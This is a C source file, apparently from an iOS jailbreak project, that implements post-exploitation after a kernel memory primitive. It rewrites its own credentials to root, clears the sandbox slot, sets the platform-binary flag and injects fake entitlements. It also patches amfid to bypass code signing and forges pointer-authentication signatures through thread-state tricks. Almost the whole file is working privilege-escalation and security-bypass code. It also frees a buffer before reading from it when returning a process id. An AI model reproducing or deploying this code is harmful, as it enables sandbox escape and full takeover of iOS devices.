//
//  post_exploit.c
//  ios-fuzzer
//
//  Created by Quote on 2021/1/28.
//  Copyright Â© 2021 Quote. All rights reserved.
//

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <pthread.h>
#include <unistd.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <mach/mach.h>
#include <copyfile.h>
#include "mycommon.h"
#include "utils.h"
#include "k_utils.h"
#include "kapi.h"
#include "k_offsets.h"

#define copyfile(X,Y) (copyfile)(X, Y, 0, COPYFILE_ALL|COPYFILE_RECURSIVE|COPYFILE_NOFOLLOW_SRC);
#define JAILB_ROOT "/private/var/containers/Bundle/jb_resources/"
static const char *jailb_root = JAILB_ROOT;

char *Build_resource_path(char *filename);
void patch_amfid(pid_t amfid_pid);

#define PROC_ALL_PIDS        1
extern int proc_listpids(uint32_t type, uint32_t typeinfo, void *buffer, int buffersize);
extern int proc_pidpath(int pid, void * buffer, uint32_t  buffersize);

pid_t look_for_proc_internal(const char *name, bool (^match)(const char *path, const char *want))
{
    pid_t *pids = calloc(1, 3000 * sizeof(pid_t));
    int procs_cnt = proc_listpids(PROC_ALL_PIDS, 0, pids, 3000);
    if(procs_cnt > 3000) {
        pids = realloc(pids, procs_cnt * sizeof(pid_t));
        procs_cnt = proc_listpids(PROC_ALL_PIDS, 0, pids, procs_cnt);
    }
    int len;
    char pathBuffer[4096];
    for (int i=(procs_cnt-1); i>=0; i--) {
        if (pids[i] == 0) {
            continue;
        }
        memset(pathBuffer, 0, sizeof(pathBuffer));
        len = proc_pidpath(pids[i], pathBuffer, sizeof(pathBuffer));
        if (len == 0) {
            continue;
        }
        if (match(pathBuffer, name)) {
            free(pids);
            return pids[i];
        }
    }
    free(pids);
    return 0;
}

pid_t look_for_proc(const char *proc_name)
{
    return look_for_proc_internal(proc_name, ^bool (const char *path, const char *want) {
        if (!strcmp(path, want)) {
            return true;
        }
        return false;
    });
}

pid_t look_for_proc_basename(const char *base_name)
{
    return look_for_proc_internal(base_name, ^bool (const char *path, const char *want) {
        const char *base = path;
        const char *last = strrchr(path, '/');
        if (last) {
            base = last + 1;
        }
        if (!strcmp(base, want)) {
            return true;
        }
        return false;
    });
}

void patch_TF_PLATFORM(kptr_t task)
{
    uint32_t t_flags = kapi_read32(task + OFFSET(task, t_flags));
    util_info("old t_flags %#x", t_flags);

    t_flags |= 0x00000400; // TF_PLATFORM
    kapi_write32(task + OFFSET(task, t_flags), t_flags);
    t_flags = kapi_read32(task + OFFSET(task, t_flags));
    util_info("new t_flags %#x", t_flags);

    // used in kernel func: csproc_get_platform_binary
}

struct proc_cred {
    char posix_cred[0x100]; // HACK big enough
    kptr_t cr_label;
    kptr_t sandbox_slot;
};

void proc_set_root_cred(kptr_t proc, struct proc_cred **old_cred)
{
    *old_cred = NULL;
    kptr_t p_ucred = kapi_read_kptr(proc + OFFSET(proc, p_ucred));
    kptr_t cr_posix = p_ucred + OFFSET(ucred, cr_posix);

    size_t cred_size = SIZE(posix_cred);
    char zero_cred[cred_size];
    struct proc_cred *cred_label;
    fail_if(cred_size > sizeof(cred_label->posix_cred), "struct proc_cred should be bigger");
    cred_label = malloc(sizeof(*cred_label));

    kapi_read(cr_posix, cred_label->posix_cred, cred_size);
    cred_label->cr_label = kapi_read64(cr_posix + SIZE(posix_cred));
    cred_label->sandbox_slot = 0;

    if (cred_label->cr_label) {
        kptr_t cr_label = cred_label->cr_label | 0xffffff8000000000; // untag, 25 bits
        cred_label->sandbox_slot = kapi_read64(cr_label + 0x10);
        kapi_write64(cr_label + 0x10, 0x0);
    }

    memset(zero_cred, 0, cred_size);
    kapi_write(cr_posix, zero_cred, cred_size);
    *old_cred = cred_label;
}

void proc_restore_cred(kptr_t proc, struct proc_cred *old_cred)
{
    // TODO
}

static struct kOSDict *self_macf;

void reset_self_ents(kptr_t proc)
{
    proc_write_MACF(proc, self_macf);
}

void proc_append_ents(kptr_t proc, const char *special_ents[], int n)
{
    struct kOSDict *macf = proc_fetch_MACF(proc);
    for (int i = 0; i < n; i++) {
        fail_if(macf->count >= macf->cap, "no MACF slots, count %d, cap %d", macf->count, macf->cap);
        struct kDictEntry *entry = borrow_fake_entitlement(special_ents[i]);
        fail_if(entry == NULL, "Can not find entitlement %s", special_ents[i]);
        macf->items[macf->count].key = entry->key;
        macf->items[macf->count].value = entry->value;
        macf->count += 1;
    }
    proc_write_MACF(proc, macf);
    free(macf);
}

void enable_tfp_ents(kptr_t proc)
{
    const char *special_ents[] = {
        "task_for_pid-allow",
        "com.apple.system-task-ports",
    };
    proc_append_ents(proc, special_ents, arrayn(special_ents));
}

void enable_container_ents(uint64_t proc)
{
    const char *special_ents[] = {
        "com.apple.private.security.container-manager",
        "com.apple.private.security.storage.AppBundles",
    };
    proc_append_ents(proc, special_ents, arrayn(special_ents));
}

void patch_codesign()
{
    util_info("patch_codesign in progress..");

    const char *amfid_bypassd_path = JAILB_ROOT"amfid_bypassd";
    if (look_for_proc(amfid_bypassd_path)) {
        util_info("amfid_bypassd already running");
        return;
    }

    enable_tfp_ents(g_exp.self_proc);
    pid_t amfid_pid = look_for_proc("/usr/libexec/amfid");
    util_info("amfid_pid %u", amfid_pid);
    patch_amfid(amfid_pid);
    reset_self_ents(g_exp.self_proc);

    // TODO
//    pid_t amfid_bypassd_pid = 0;
//    if(fork() == 0){
//        daemon(1, 1);
//        close(STDIN_FILENO);
//        close(STDOUT_FILENO);
//        close(STDERR_FILENO);
//        const char *argv[] = {amfid_bypassd_path, NULL};
//        execvp(argv[0], (char*const*)argv);
//        exit(1);
//    }
//    while(!(amfid_bypassd_pid = look_for_proc(amfid_bypassd_path))){}
//    util_info("amfid_bypassd_pid: %d", amfid_bypassd_pid);
//    uint64_t target_proc = find_proc_byPID(amfid_bypassd_pid);
//    uint64_t target_task = KernelRead_8bytes(target_proc + OFFSET_bsd_info_task);
//    patch_TF_PLATFORM(target_task);
    util_info("amfid_bypassd took off");
}

#pragma mark ---- Post-exp ---- Copy Jailbreak Resources

void check_file_type_and_give_em_permission(char *file_path)
{
    uint32_t HeaderMagic32 = 0xFEEDFACE; // MH_MAGIC
    uint32_t HeaderMagic32Swapped = 0xCEFAEDFE; // MH_CIGAM
    uint32_t HeaderMagic64 = 0xFEEDFACF; // MH_MAGIC_64
    uint32_t HeaderMagic64Swapped = 0xCFFAEDFE; // MH_CIGAM_64
    uint32_t UniversalMagic = 0xCAFEBABE; // FAT_MAGIC
    uint32_t UniversalMagicSwapped = 0xBEBAFECA; // FAT_CIGAM

    struct stat fstat = {0};
    if(stat(file_path, &fstat)){
        return;
    }
    if(fstat.st_size < (20))
        return;

    int fd = open(file_path, O_RDONLY);
    if(fd){
        uint32_t *file_head4bytes = mmap(NULL, PAGE_SIZE, PROT_READ, MAP_SHARED, fd, 0);
        if((int)(file_head4bytes) == -1){
            close(fd);
            return;
        }
        if((*file_head4bytes == HeaderMagic32) ||
           (*file_head4bytes == HeaderMagic32Swapped) ||
           (*file_head4bytes == HeaderMagic64) ||
           (*file_head4bytes == HeaderMagic64Swapped) ||
           (*file_head4bytes == UniversalMagic) ||
           (*file_head4bytes == UniversalMagicSwapped) ||
           !strncmp((char*)file_head4bytes, "#!", 2)
           ){
            chown(file_path, 0, 0);
            chmod(file_path, 0755);
        }
        munmap(file_head4bytes, PAGE_SIZE);
        close(fd);
    }
}

#include <dirent.h>

void alter_exec_perm_in_dir(const char *name, int i_deep)
{
    DIR *dir;
    struct dirent *entry;

    if (!(dir = opendir(name))){
        return;
    }

    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_DIR) {
            char path[1024];
            if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
                continue;
            if(entry->d_name[0] == '.')
                continue;
            snprintf(path, sizeof(path), "%s/%s", name, entry->d_name);

            alter_exec_perm_in_dir(path, i_deep+1);
        } else {
            char path[1024];
            snprintf(path, sizeof(path), "%s/%s", name, entry->d_name);

            check_file_type_and_give_em_permission(path);
        }
    }
    closedir(dir);
}

void move_in_jbResources()
{
    util_info("copying shell cmds in progress...");

    enable_container_ents(g_exp.self_proc);
    int err = mkdir(jailb_root, 0777);
    if (err) {
        perror("mkdir");
    }
    // test amfid-bypass
    copyfile(Build_resource_path("/jb_resources/id"), jailb_root);
    alter_exec_perm_in_dir(JAILB_ROOT, 0);

    reset_self_ents(g_exp.self_proc);
}

#pragma mark ---- userspace PAC bypass ----

#if __arm64e__
static mach_port_t amfid_thread;
static volatile void *target_pc;
static volatile void *signed_pc;

static uint64_t thread_copy_jop_pid(mach_port_t to, mach_port_t from)
{
    kptr_t thread_to = port_name_to_kobject(to);
    kptr_t thread_from = port_name_to_kobject(from);
    uint64_t jop_pid = kapi_read64(thread_from + OFFSET(thread, jop_pid));
    uint64_t to_jop_pid = kapi_read64(thread_to + OFFSET(thread, jop_pid));
    util_info("replace jop_pid %#llx -> %#llx", to_jop_pid, jop_pid);
    kapi_write64(thread_to + OFFSET(thread, jop_pid), jop_pid);
    return to_jop_pid;
}

static void thread_set_jop_pid(mach_port_t to, uint64_t jop_pid)
{
    kptr_t thread_to = port_name_to_kobject(to);
    kapi_write64(thread_to + OFFSET(thread, jop_pid), jop_pid);
}

static void uPAC_bypass_strategy_2()
{
    mach_port_t thread;
    kern_return_t err;

    err = thread_create(mach_task_self(), &thread);
    fail_if(err != KERN_SUCCESS, "Created thread");

    arm_thread_state64_t state;
    mach_msg_type_number_t count = ARM_THREAD_STATE64_COUNT;
    err = thread_get_state(mach_thread_self(), ARM_THREAD_STATE64, (thread_state_t)&state, &count);
    fail_if(err != KERN_SUCCESS, "Got own thread state");

    void *pc = (void *)((uintptr_t)target_pc & ~0xffffff8000000000);
    pc = ptrauth_sign_unauthenticated(pc, ptrauth_key_asia, ptrauth_string_discriminator("pc"));
    state.__opaque_pc = pc;
    err = thread_set_state(thread, ARM_THREAD_STATE64, (thread_state_t)&state, ARM_THREAD_STATE64_COUNT);
    fail_if(err != KERN_SUCCESS, "Set child thread's PC to a corrupted pointer");

    uint64_t saved_jop_pid = thread_copy_jop_pid(thread, amfid_thread);
    count = ARM_THREAD_STATE64_COUNT;
    err = thread_get_state(thread, ARM_THREAD_STATE64, (thread_state_t)&state, &count);
    fail_if(err != KERN_SUCCESS, "Got child's thread state");

    signed_pc = state.__opaque_pc;
    util_info("strategy 2, signed pc %p", signed_pc);

    thread_set_jop_pid(thread, saved_jop_pid);
    err = thread_terminate(thread);
    fail_if(err != KERN_SUCCESS, "Terminated thread");
}

static void uPAC_bypass_strategy_3()
{
    mach_port_t thread;
    kern_return_t err;

    err = thread_create(mach_task_self(), &thread);
    fail_if(err != KERN_SUCCESS, "Created thread");

    arm_thread_state64_t state;
    mach_msg_type_number_t count = ARM_THREAD_STATE64_COUNT;
    err = thread_get_state(mach_thread_self(), ARM_THREAD_STATE64, (thread_state_t)&state, &count);
    fail_if(err != KERN_SUCCESS, "Got own thread state");

    void *pc = (void *)((uintptr_t)target_pc & ~0xffffff8000000000);
    pc = ptrauth_sign_unauthenticated(pc, ptrauth_key_asia, ptrauth_string_discriminator("pc"));
    state.__opaque_pc = pc;
    arm_thread_state64_t amfid_state;
    count = ARM_THREAD_STATE64_COUNT;
    err = thread_convert_thread_state(amfid_thread, THREAD_CONVERT_THREAD_STATE_FROM_SELF, ARM_THREAD_STATE64,
            (thread_state_t)&state, ARM_THREAD_STATE64_COUNT,
            (thread_state_t)&amfid_state, &count);
    fail_if(err != KERN_SUCCESS, "Convert thread");

    signed_pc = amfid_state.__opaque_pc;
    util_info("strategy 3, signed pc %p", amfid_state.__opaque_pc);

    err = thread_terminate(thread);
    fail_if(err != KERN_SUCCESS, "Terminated thread");
}

void *userspace_PAC_hack(mach_port_t target_thread, void *pc)
{
    amfid_thread = target_thread;
    target_pc = pc;
    //uPAC_bypass_strategy_2();
    uPAC_bypass_strategy_3();
    return (void *)signed_pc;
}
#endif

#pragma mark ---- Post-exp main entry ----

void post_exploit(void)
{
    util_info("update proc_self credential");
    // can not do this under PAC
    //kapi_write64(g_exp.self_proc + OFFSET(proc, p_ucred), kernelCredAddr);
    struct proc_cred *old_cred;
    proc_set_root_cred(g_exp.self_proc, &old_cred);
    util_msleep(100);

    int err = setuid(0);
    if (err) {
        perror("setuid");
    }

    // Test writing to the outer worlds
    if (1) { // ok
        FILE *fp = fopen("/var/mobile/test.txt", "wb");
        fail_if(fp == NULL, "failed to write /var/mobile/test.txt");
        util_info("wrote test file: %p", fp);
        fprintf(fp, "hello from pattern-f\n");
        fclose(fp);
    }

    util_info("now we are out of sandbox, check \"/bin/ps -p 1\"");
    // test exec command
    //util_runCommand("/bin/ls", NULL); // not provided by Apple
    util_runCommand("/bin/ps", "-p", "1", NULL); // built-in tools

    patch_TF_PLATFORM(g_exp.self_task);
    prepare_fake_entitlements();
    self_macf = proc_fetch_MACF(g_exp.self_proc);

    patch_codesign();

    move_in_jbResources();

    chdir(jailb_root);
    // test amfid-bypass
    util_runCommand("./id", NULL);

    // ----------------------------------------------------------------------
    //
    util_info("TODO insert your code here");
    //
    // ----------------------------------------------------------------------

    proc_restore_cred(g_exp.self_proc, old_cred);
    free(old_cred);
}
